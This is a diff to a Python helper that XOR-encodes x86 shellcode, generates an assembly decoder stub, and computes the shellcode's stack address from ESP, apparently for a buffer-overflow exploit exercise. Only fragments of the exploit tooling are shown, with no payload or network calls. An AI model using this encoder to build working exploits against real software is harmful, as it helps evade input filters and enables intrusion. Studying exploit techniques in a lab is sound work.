@@ -50,8 +50,7 @@ def encode(data):
             new_shellcode += code_byte # append to new shellcode
             xor_indces.append(i) # mark index that was xor'ed
         else:
-            new_shellcode += data[i] # else, don't change index
-
+            new_shellcode += data[i] # else, don't change data
     return new_shellcode, xor_indces
 
 
@@ -63,13 +62,13 @@ def get_decoder(indices):
     init_edx = "push 0; pop edx;" # initiate edx to zero
     decoder_assembly = create_ff + init_edx
 
-    edx_current_value = 0
+    current_value = 0
     for i in indices:
-        edx_i_diff = i - edx_current_value # this is how much we should increment edx for current i vaule
-        inc = "inc edx;" * edx_i_diff # do as much increment as needed
-        xr = "xor byte ptr [eax + edx], BL;" # then, perform the decoding
+        index_diff = i - current_value # this is how much we should increment edx for current i vaule
+        inc = "inc eax;" * index_diff # do as much increment as needed
+        xr = "xor byte ptr [eax], BL;" # then, perform the decoding
         decoder_assembly += inc + xr # update our decoder code
-        edx_current_value += edx_i_diff # update current edx value
+        current_value += index_diff # update current edx value
 
     decoder = assemble.assemble_data(decoder_assembly) # assemble our code
     return decoder
@@ -91,7 +90,7 @@ def get_shellcode():
     # print shellcode_length
 
     init_to_esp = "push esp; pop eax;" # init eax as esp value
-    sub_eax = "push 127; sub eax, [esp]; push 112; sub eax, [esp];" # subtract from esp 239 bytes
+    sub_eax = "dec eax;" * (shellcode_length + 4) # subtract from esp shellcode length + 4 bytes of RET
     # after these two lines eax should contains the value 0xbfffe0e1 which is the beginnig of the shellcode
     init_eax = init_to_esp + sub_eax
     init_eax_assm = assemble.assemble_data(init_eax)
